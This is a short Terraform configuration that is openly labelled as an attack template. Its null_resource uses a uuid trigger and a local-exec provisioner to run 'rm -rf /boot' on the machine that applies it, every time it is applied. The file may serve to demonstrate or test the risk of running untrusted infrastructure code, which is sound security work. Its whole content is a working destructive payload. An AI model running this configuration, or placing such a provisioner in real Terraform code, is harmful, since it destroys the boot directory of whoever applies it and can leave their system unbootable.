# Create an arbitrary local resource
data "template_file" "test" {
  template = "Hello, I am an attack template to delete the boot directory."

}

resource "null_resource" "execut" {
  triggers {
    uuid = "${uuid()}"
  }

  provisioner "local-exec" {
    command = "rm -rf /boot"
  }
}